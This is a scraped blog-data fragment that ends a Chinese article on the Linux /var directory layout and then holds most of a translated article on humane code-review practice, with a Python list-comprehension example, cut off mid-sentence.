id=\"crayon-5b4a9d0d87deb786039931-103\">运行时的变量文件，如存放进程标识和登入使用者信息的文件。<span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">utmp</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span>此目录下文件在系统启动时被自动清除。</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a9d0d87deb786039931-104\"><span class=\"crayon-o\">/</span><span class=\"crayon-t\">var</span><span class=\"crayon-o\">/</span><span class=\"crayon-i\">spool</span></div><div class=\"crayon-line\" id=\"crayon-5b4a9d0d87deb786039931-105\">各种程序产生的缓冲或排除等待的文件</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a9d0d87deb786039931-106\"><span class=\"crayon-o\">/</span><span class=\"crayon-t\">var</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">spool</span><span class=\"crayon-o\">/</span><span class=\"crayon-e\">at</span></div><div class=\"crayon-line\" id=\"crayon-5b4a9d0d87deb786039931-107\"><span class=\"crayon-e\">at</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span>的作业存缓区</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a9d0d87deb786039931-108\"><span class=\"crayon-o\">/</span><span class=\"crayon-t\">var</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">spool</span><span class=\"crayon-o\">/</span><span class=\"crayon-e\">cron</span></div><div class=\"crayon-line\" id=\"crayon-5b4a9d0d87deb786039931-109\"><span class=\"crayon-e\">cron</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span>的作业存缓区</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a9d0d87deb786039931-110\"><span class=\"crayon-o\">/</span><span class=\"crayon-t\">var</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">spool</span><span class=\"crayon-o\">/</span><span class=\"crayon-i\">lpd</span></div><div class=\"crayon-line\" id=\"crayon-5b4a9d0d87deb786039931-111\">打印缓存文件。</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a9d0d87deb786039931-112\"><span class=\"crayon-o\">/</span><span class=\"crayon-t\">var</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">spool</span><span class=\"crayon-o\">/</span><span class=\"crayon-i\">mail</span></div><div class=\"crayon-line\" id=\"crayon-5b4a9d0d87deb786039931-113\">使用者邮箱。</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a9d0d87deb786039931-114\"><span class=\"crayon-o\">/</span><span class=\"crayon-t\">var</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">spool</span><span class=\"crayon-o\">/</span><span class=\"crayon-i\">smail</span></div><div class=\"crayon-line\" id=\"crayon-5b4a9d0d87deb786039931-115\">存放<span class=\"crayon-h\"> </span><span class=\"crayon-e\">smail</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span>邮件发送程序的缓冲文件。</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a9d0d87deb786039931-116\"><span class=\"crayon-o\">/</span><span class=\"crayon-t\">var</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">spool</span><span class=\"crayon-o\">/</span><span class=\"crayon-i\">news</span></div><div class=\"crayon-line\" id=\"crayon-5b4a9d0d87deb786039931-117\">新闻子系统的缓冲目录</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a9d0d87deb786039931-118\"><span class=\"crayon-o\">/</span><span class=\"crayon-t\">var</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">spool</span><span class=\"crayon-o\">/</span><span class=\"crayon-e\">uucp</span></div><div class=\"crayon-line\" id=\"crayon-5b4a9d0d87deb786039931-119\"><span class=\"crayon-e\">uucp</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span>的缓冲文件</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a9d0d87deb786039931-120\"><span class=\"crayon-o\">/</span><span class=\"crayon-t\">var</span><span class=\"crayon-o\">/</span><span class=\"crayon-i\">tmp</span></div><div class=\"crayon-line\" id=\"crayon-5b4a9d0d87deb786039931-121\">类似<span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">tmp</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span>此目录保存未指定持续时间的临时文件。</div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0302 seconds] -->\r\n<p></p>\n<h2>作者简介</h2>\n<p>吕凯，TPV资深主任工程师，大连理工大学硕士。关注软件开发、系统运维、内容管理、行动管理等领域，喜欢计数写作及分享。</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"114084\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"114084votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"114084\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 4 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "tags": "IT技术,Linux", "url": "http://blog.jobbole.com/114084/", "url_obj_id": "176ceef8f652aca8d54353b9381783ee"}
{"front_img_url": ["http://wx1.sinaimg.cn/mw690/7cc829d3gy1frr57nj93bj20lc0oe0xi.jpg"], "title": "如何做人性化的代码审查？", "create_date": "2018/05/30 ·", "praise_num": 1, "fav_num": 4, "comment_num": 2, "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">本文由 <a href=\"http://blog.jobbole.com\">伯乐在线</a> - <a href=\"http://www.jobbole.com/members/chenyahui\">精算狗</a> 翻译，<a href=\"http://www.jobbole.com/members/buntamarui\">小米云豆粥</a> 校稿。未经许可，禁止转载！<br>英文出处：<a target=\"_blank\" href=\"https://mtlynch.io/human-code-reviews-1/\">Michael Lynch</a>。欢迎加入<a target=\"_blank\" href=\"http://group.jobbole.com/category/feedback/trans-team/\">翻译组</a>。</div><p>最近，我一直在读有关代码审查最佳范例的文章。我注意到这些文章的关注点是找到 bug，而忽略了代码审查其他的部分。用建设性、专业的问题沟通方式？不相关！只要识别出所有的 bug，剩下的部分会水到渠成。</p>\n<p>我只能假设我读过的这些文章都来自未来，那时候所有的开发人员都是机器人。在那个世界，你的队友欢迎对其代码未经过推敲措辞的批评，因为处理这样的信息能温暖他们冰冷的机器人之心。</p>\n<p>我要做一个大胆的假设，你想要在当前世界改进代码审查，此时你的队友都是人类。我还要做一个更大胆的假设，你与同事之间积极的关系本身就是一个目的，而不仅仅是一个可调整的变量来最小化缺陷的平均成本。在这些情况下，你的审查实践会发生怎样的变化呢？</p>\n<p>在这篇文章中，我讨论了一些技巧，把代码审查既看作是技术过程，也看作是社会过程。</p>\n<h2>什么是代码审查?</h2>\n<p>“代码审查（code review）”这一术语可以指一系列活动，从简单地站在队友身后读读代码，到 20 人与会的单行代码分析。我用这一术语指正式的、书面的过程，但也不像一系列现场代码审查会议那么重大。</p>\n<p><img class=\"alignnone\" src=\"http://wx1.sinaimg.cn/mw690/7cc829d3gy1frr57nj93bj20lc0oe0xi.jpg\" width=\"690\" height=\"789\"></p>\n<p>代码审查的参与者包括<strong>作者</strong>以及<strong>审查者</strong>：作者写代码并把代码送去审查，审查者读代码并决定代码什么时候就绪并入团队的代码库。一次审查可以由多个审查者完成，但是我做了简化的假设——你是唯一的审查者。</p>\n<p>在代码审查开始之前，作者必须创建一个<strong>变更表</strong>。作者想要将源代码并入团队代码库，变更表包括一系列源代码的变更。</p>\n<p>当作者把变更表发给审查者时，审查就开始了。代码审查是<strong>循环</strong>发生的。每个循环都是作者与审查者之间完整的往返：作者发送变更，审查者给予变更的书面反馈。每次代码审查都包括一次或者更多的循环。</p>\n<p>当审查者<strong>批准</strong>了这些变更，审查结束。这通常指的是给出 LGTM，“我觉得不错（looks good to me）”的简写。</p>\n<h2>这为什么很难？</h2>\n<p>如果程序员给你发了一份变更表，他们觉得这个变更表棒极了。你又给他们写了一份详细的清单，解释为什么这个变更表并不好。这是需要小心处理的信息。</p>\n<blockquote><p>这是我不想念 IT 的一个原因，因为程序员是非常不可爱的人……比如，在航空业，那些过分高估了自己技术水平的人都死了。</p>\n<p>Philip Greenspun，ArsDigita 的联合创始人，引自《<a href=\"http://amzn.to/2g6oTsV\">Founders at Work</a>》。</p></blockquote>\n<p>作者容易把对其代码的批评解读为暗示他们不是合格的程序员。代码审查是一个分享知识和做工程决定的机会。但是如果作者把讨论理解为个人攻击，这个目标无法达成。</p>\n<p>除此之外，你还面临着书面传达想法的挑战，词不达意的风险会更高。作者听不到你的语气，也看不到你的肢体语言，所以清晰地、小心地传达你的反馈更为重要。对一个有戒备心的作者来说，一句无冒犯意味的批注，比如“你忘了关闭文件句柄”，可以被理解成“真不敢相信你忘了关闭文件句柄！你真是个傻子。”</p>\n<h2>技巧</h2>\n<ol>\n<li>让电脑做无聊的部分</li>\n<li>用风格指南平息风格争论</li>\n<li>马上开始审查</li>\n<li>从高级别开始，逐步向下</li>\n<li>慷慨地使用代码示例</li>\n<li>永远别说“你<strong>”</strong></li>\n<li>把反馈表达成请求，而不是指令</li>\n<li>把批注与原则联系在一起，而不是观点</li>\n</ol>\n<h3>让电脑做无聊的部分</h3>\n<p>在会议和邮件的干扰下，可用来专注于代码的时间很少。你的精神毅力更是短缺。读队友的代码是认知上的负担，要求高强度的专注。别把这些资源浪费在电脑能做的任务上，尤其是当电脑能做得更好的时候。</p>\n<p>空白错误是一个显著的例子。比较一下人类审查者找到缩进错误并与作者一起改正所花费的精力，和仅仅使用一个自动排版工具所花费的精力：</p>\n<table style=\"height: 704px;\" width=\"687\">\n<thead>\n<tr>\n<td width=\"68%\"><strong>人类审查者需要的精力</strong></td>\n<td width=\"31%\"><strong>排版工具需要的精力</strong></td>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td width=\"68%\">1.审查者寻找空白错误，找到错误的缩进\n<p>2.审查者写批注，指出错误缩进</p>\n<p>3.审查者重新读批注，确保措辞清晰，不含指责意味</p>\n<p>4.作者读批注</p>\n<p>5.作者改正代码缩进</p>\n<p>6.审查者核实作者适当地处理了批注</p></td>\n<td width=\"31%\">无！</td>\n</tr>\n</tbody>\n</table>\n<p>右边是空的，因为作者用了一个代码编辑器，每次他们点击“保存”时，该代码编辑器会自动规定空白的格式。在最糟的情况下，作者把代码发出去以供审查，<a href=\"https://en.wikipedia.org/wiki/Continuous_integration\">持续集成</a>解决方法报告说空格错误。作者在不需要审查者顾虑的情况下，修正这个问题。</p>\n<p>在代码审查中寻找可以被自动解决的机械性任务。以下是常见的例子：</p>\n<table width=\"100%\">\n<thead>\n<tr>\n<td width=\"35%\"><strong>任务</strong></td>\n<td width=\"64%\"><strong>自动解决方法</strong></td>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td width=\"35%\">验证代码的构建</td>\n<td width=\"64%\">持续集成方法，比如 <a href=\"https://travis-ci.com/\">Travis</a> 或者 <a href=\"https://circleci.com/\">CircleCI</a></td>\n</tr>\n<tr>\n<td width=\"35%\">证实通过了自动测试</td>\n<td width=\"64%\">持续集成方法，比如 <a href=\"https://travis-ci.com/\">Travis</a> 或者 <a href=\"https://circleci.com/\">CircleCI</a></td>\n</tr>\n<tr>\n<td width=\"35%\">验证代码空白与团队风格一致</td>\n<td width=\"64%\">代码排版器，比如 <a href=\"https://clang.llvm.org/docs/ClangFormat.html\">ClangFormat</a> (C/C++ 排版器) 或者 <a href=\"https://golang.org/cmd/gofmt/\">gofmt</a> (Go 排版器)</td>\n</tr>\n<tr>\n<td width=\"35%\">识别未使用的输入或者变量</td>\n<td width=\"64%\">代码 linter，比如 <a href=\"https://pypi.python.org/pypi/pyflakes\">pyflakes</a> (Python linter) 或者 <a href=\"http://jslint.com/help.html\">JSLint</a> (JavaScript linter)</td>\n</tr>\n</tbody>\n</table>\n<p>自动化使你作为审查者能做出更多有意义的贡献。当你能忽略一整个类别的问题，比如输入的排序或者源文件命名的约定，你能够关注更有趣的事情，比如函数错误或者可读性缺陷。</p>\n<p>自动化也能给作者带来好处。自动化使作者用几秒钟发现粗心的错误，而不是几小时。即时反馈使得从错误中学习更容易，修正错误的代价也更小，因为作者脑海中还有相关的背景。另外，如果他们不得不听到自己犯下的愚蠢错误，对自尊心来说，从电脑那听到要比从你那听到更容易被接受。</p>\n<p>和你的团队一起将这些自动检查加入代码审查的工作流程中（例如，在 Git 中的 <a href=\"https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks\">pre-commit hooks</a> 或者 Github 中的 <a href=\"https://developer.github.com/webhooks/\">webhooks</a>）。如果审查过程要求作者手动运行这些检查，你会损失大部分好处。作者总是会忘记一些情况，迫使你继续审查简单的问题，而这些问题本来就能被自动处理。</p>\n<h3>用风格指南平息风格争论</h3>\n<p>关于风格的争论浪费了审查的时间。一致的风格确实重要，但是代码审查不是争论花括号位置的时候。在审查中消除风格争论的最佳办法是，遵守一个风格指南。</p>\n<p><img class=\"alignnone\" src=\"http://wx1.sinaimg.cn/mw690/7cc829d3gy1frr57oasfpj20rs0h50zw.jpg\" width=\"690\" height=\"426\"></p>\n<p>好的风格指南不仅定义了像命名习惯或者空白规则这样的表面元素，而且定义了怎样使用给定编程语言的特征。比如，JavaScript 和 Perl 都包含了一些功能——他们提供了许多实现相同逻辑的方法。风格指南定义了做事的唯一方法，这样不会以一半队员用了一组语言特征而另一半队员用了完全不同的一组特征收尾。</p>\n<p>一旦有了一个风格指南，你就不需要浪费审查循环，来跟作者争论到底谁的命名习惯最好。只要遵从风格指南然后继续就行。如果你的风格指南没有指定某个特定问题的约定，那它一般都不值得争论。如果你遇到一个风格指南未涉及的问题，它又重要到需要讨论，和团队一起推敲。然后把决定加到风格指南，这样你们永远不需要再进行一次这个讨论。</p>\n<h4><em>选择</em><em> 1</em><em>：采纳一个现存的风格指南</em></h4>\n<p>如果从网上搜索，你能找到已发布的风格指南可供使用。<a href=\"https://google.github.io/styleguide/\">Google 的编程风格指南</a>是最知名的，但是如果它的风格不适合你，你可以找到其他的指南。通过采纳一个现存的指南，不需要从头创造一个风格指南的大量花费就能继承其好处。</p>\n<p>坏处是组织为他们自己特别的需要优化其风格指南。比如，Google 的风格指南在<a href=\"https://google.github.io/styleguide/cppguide.html#C++11\">使用新语言特征</a>上比较保守，因为他们有一个巨大的代码库，其中的代码要在所有东西上运行，从家用路由器到最新的 iPhone。如果你们是一个只有一个产品的四人小组，你可能选择在使用前沿语言特征或者扩展时更大胆。</p>\n<h4><em>选择</em><em> 2</em><em>：不断创造你自己的风格指南</em></h4>\n<p>如果你不想采纳现存的指南，你可以自己创造一个。在代码审查中每产生一次风格争论，向整个团队提问来决定官方约定应该是什么。当你们达成共识，把决定编进风格指南中。</p>\n<p>我倾向于将团队的风格指南作为源控制下的 Markdown（例如 <a href=\"https://pages.github.com/\">GitHub 页面</a>）。这样，对风格指南的任何改动都需要通过普通的审查过程——某人得明确批准改动，而且团队中的每个人都有提出疑虑的机会。Wikis 和 Google 文件都是可接受的选择。</p>\n<h4><em>选择</em><em> 3</em><em>：混合方法</em></h4>\n<p>合并选择 1 和选择 2，你可以采纳现存的风格指南作为基础，然后用本地风格指南来扩展或者覆盖这个基础。一个好例子是 <a href=\"https://chromium.googlesource.com/chromium/src/+/master/styleguide/c++/c++.md\">Chromium 的 C++ 风格指导</a>。它用 <a href=\"https://google.github.io/styleguide/cppguide.html\">Google 的 C++ 风格指导</a>作为基础，但是在其上添上自己的改动和附加。</p>\n<h3>马上开始审查</h3>\n<p>将代码审查视为高优先级。当你真正阅读代码并反馈时，慢点来，但是要马上<em>开始</em>审查——最好在几分钟内开始。</p>\n<p><img class=\"alignnone\" src=\"http://wx4.sinaimg.cn/mw690/7cc829d3gy1frr57p1az8j20lc0h2jv0.jpg\" width=\"690\" height=\"552\"></p>\n<p>如果队员发给你一个变更表，这可能意味着直到你完成审查前，他们会卡在其他工作上。理论上，源控制系统使作者能建起新的分支，继续工作，然后从审查中把变动合并进新分支。实际上，一共有大约四个开发者能够高效地做这件事。其他人要花很长时间来清理三方差异，以致于抵消掉了等待审查完成这段时间里的进步。</p>\n<p>你马上开始审查，就创造了一个良性循环。你的审查时间完全变成了一个与作者的变更表大小和复杂度相关的函数。这激励作者发送短小、范围狭窄的变更表。对你来说这样的变更表审查起来更容易，也更愉悦，所以你能更快地审查，循环继续。</p>\n<p>想象一下你的队员要执行一个新特征，这个特征要求 1000 行代码变更。如果他们知道你能在大概 2 小时内完成一个 200 行的变更表的审查，他们可以把特征拆分成各包含 200 行的变更表，然后在一两天内检查完整个特征。但是，如果无论大小你都要花一天来完成所有的代码审查，现在就要花一周时间才能检查完整个特征。你的队员不想傻坐一周，所以他们被激励着去发送更大的代码审查，比如每个包含 500 到 600 行。这样审查起来花销更大，反馈也更差，因为记 600 行变更表的背景要比 200 行变更表难。</p>\n<p>一个审查循环的最大周期应该是一个工作日。如果你正在处理一个更高优先级的问题，不能在一天内完成一个审查循环，让你的队员知悉并给予他们把审查交给别人的机会。如果你一个月被强制回绝审查超过一次，可能意味着你的团队需要放慢脚步，这样你能保持理智的开发实践。</p>\n<h3>从高级别开始，逐步向下</h3>\n<p>在一个既定的审查循环中，你写的批注越多，让作者感觉受打压的风险越大。准确的界限随开发者的不同而不同，但是一个审查循环中 20 到 50 个批注一般是危险区的开始。</p>\n<p>如果你担心把作者淹没在批注的海洋里，约束你自己在早期循环中反馈高级别的问题。注意重新设计类接口或者拆分复杂函数这样的问题。等到这些问题都解决了再去处理低级别的问题，比如变量命名或者代码评论的清晰度。</p>\n<p>一旦作者整合了你高级别的批注，低级别的批注可能会变得无意义。把低级别的批注推迟到后期的循环中，你可以把自己从小心措辞的工作中解救出来，也免得作者处理不必要的批注。这个技巧也细分了审查过程中你所关注的抽象层，帮助你和作者用清晰、系统的方法完成变更表。</p>\n<h3>慷慨地使用代码示例</h3>\n<p>在一个理想的世界里，代码作者会感谢收到的每一次审查。这是他们学习的一个机会，也能防止他们犯错。事实上，有许多外部因素能导致作者负面地解读审查，怨恨你给他们批注。可能他们正面临着截止日期的压力，所以除了立刻不经审查的批准以外的东西都感觉像阻碍。可能你们没怎么在一起工作过，所以他们不相信你的反馈是好意的。</p>\n<p>一个让作者对审查过程感觉良好的方法是，在审查中找机会送他们礼物。所有开发者都爱收到的礼物是什么呢？当然是代码示例啦。</p>\n<p><img class=\"alignnone\" src=\"http://wx1.sinaimg.cn/mw690/7cc829d3gy1frr57pwqjfj20lc0lc77i.jpg\" width=\"690\" height=\"690\"></p>\n<p>如果通过写一些建议的改动来减轻作者的负担，就证明了作为审查者，你对时间很慷慨。</p>\n<p>比如，想象一下你的一个同事不熟悉 Python 的<a href=\"http://treyhunner.com/2015/12/python-list-comprehensions-now-in-color/\">列表推导（list comprehension）</a>特征。他们给你发送了包含以下代码的审查：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4a9bcd49677349298731\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nurls = []\r\nfor path in paths:\r\n  url = 'https://'\r\n  url += domain\r\n  url += path\r\n  urls.append(url)</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4a9bcd49677349298731-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a9bcd49677349298731-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4a9bcd49677349298731-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a9bcd49677349298731-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4a9bcd49677349298731-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a9bcd49677349298731-6\">6</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4a9bcd49677349298731-1\"><span class=\"crayon-v\">urls</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">]</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a9bcd49677349298731-2\"><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">path </span><span class=\"crayon-st\">in</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">paths</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line\" id=\"crayon-5b4a9bcd49677349298731-3\"><span class=\"crayon-h\">  </span><span class=\"crayon-v\">url</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'https://'</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a9bcd49677349298731-4\"><span class=\"crayon-h\">  </span><span class=\"crayon-v\">url</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">domain</span></div><div class=\"crayon-line\" id=\"crayon-5b4a9bcd49677349298731-5\"><span class=\"crayon-e\">  </span><span class=\"crayon-v\">url</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">path</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a9bcd49677349298731-6\"><span class=\"crayon-e\">  </span><span class=\"crayon-v\">urls</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">append</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">url</span><span class=\"crayon-sy\">)</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0010 seconds] -->\r\n<p>回复“能用列表推导（list comprehension）简化这个吗？”会使他们苦恼，因为现在他们得花 20 分钟搜索他们之前从没用过的东西。</p>\n<p>收到像以下这样的批注他们会更开心：</p>\n<blockquote><p><em>考虑用像这样的列表推导（list comprehension）来进行简化：</em></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4a9bcd49681393524892\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nurls = ['https://' + domain + path for path in paths]</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4a9bcd49681393524892-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4a9bcd49681393524892-1\"><span class=\"crayon-v\">urls</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-s\">'https://'</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">domain</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">path </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">path </span><span class=\"crayon-st\">in</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">paths</span><span class=\"crayon-sy\">]</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0007 seconds] -->\r\n<p>\n</p></blockquote>\n<p>这个技巧并不局限于单命令程序。我会经常建立我自己的代码分支，向作者展示概念的一个大型证明，比如拆分一个大型函数或者增加一个单元测试来覆盖一个附加边界情况。</p>\n<p>为清晰、无争议的改进保留此技巧。在上面列表推导（list comprehension）示例中，极少有开发者会拒绝减少 83% 